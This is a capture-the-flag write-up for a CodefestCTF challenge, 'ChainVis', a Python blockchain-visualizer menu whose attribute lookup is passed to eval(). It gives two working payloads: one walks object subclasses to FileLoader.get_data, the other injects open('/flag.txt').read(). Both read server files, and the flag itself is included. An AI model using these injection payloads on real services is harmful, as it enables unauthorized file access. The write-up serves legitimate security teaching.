# ChainVis

Total Solves - 24

Final Points - 416

## Description
I tried to understand blockchain. Seemed too tough so I made a visualizer for a chain....with blocks.

## Writeup

```
 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗    ██╗   ██╗██╗███████╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║    ██║   ██║██║██╔════╝
██║     ███████║███████║██║██╔██╗ ██║    ██║   ██║██║███████╗
██║     ██╔══██║██╔══██║██║██║╚██╗██║    ╚██╗ ██╔╝██║╚════██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║     ╚████╔╝ ██║███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝      ╚═══╝  ╚═╝╚══════╝
                                                                                          
A blockchain visualizer. Atleast I think so.
    
1. Add a block to the chain
2. View chain
3. Access a block
4. Exit
    
[-] ENTER OPTION: 1
[-] MONEY IN THE TRANSACTION: 100

1. Add a block to the chain
2. View chain
3. Access a block
4. Exit
    
[-] ENTER OPTION: 2
[*] 1 BLOCKS IN CHAIN.

----------
| ID - 1 |
----------
            

1. Add a block to the chain
2. View chain
3. Access a block
4. Exit
    
[-] ENTER OPTION: 3
[-] CHOOSE BLOCK ID: 1

[*] SELECTED BLOCK ID: 1
1. Access Attribute (eg - id)
2. Back to main menu
            
[-] ENTER OPTION: 1
ATTRIBUTE: id
1
```
This is the normal flow of the program. Now As you can see, there is an option to access attribute from the block object. Now you were expected to think the ways this can be done and if you can access something other than intended attributes.

### Method 1

Use class methods and use `<class '_frozen_importlib_external.FileLoader'>` and print flag. You can use other subclass methods as well.

```python
[-] ENTER OPTION: 1
ATTRIBUTE: __class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '__main__.Block'>]
```

```python
[-] ENTER OPTION: 1
ATTRIBUTE: __class__.__bases__[0].__subclasses__()[134]
<class '_frozen_importlib_external.FileLoader'>
```

```python
[-] ENTER OPTION: 1
ATTRIBUTE: __class__.__bases__[0].__subclasses__()[134].get_data(".", "/flag.txt")
b'CodefestCTF{n07_r34lly_4_bl0ckch41n_KzLvWkDN}\n'
```
 ### Method 2

 The attribute is called using `eval("print(block."+attr+")")`. If you realise this after some inputs, you can do command injection easily.

 ```python
 [-] ENTER OPTION: 1
ATTRIBUTE: id, open('/flag.txt', 'r').read()
1 CodefestCTF{n07_r34lly_4_bl0ckch41n_KzLvWkDN}
 ```

## Flag
`CodefestCTF{n07_r34lly_4_bl0ckch41n_[a-zA-Z0-9]{8}}`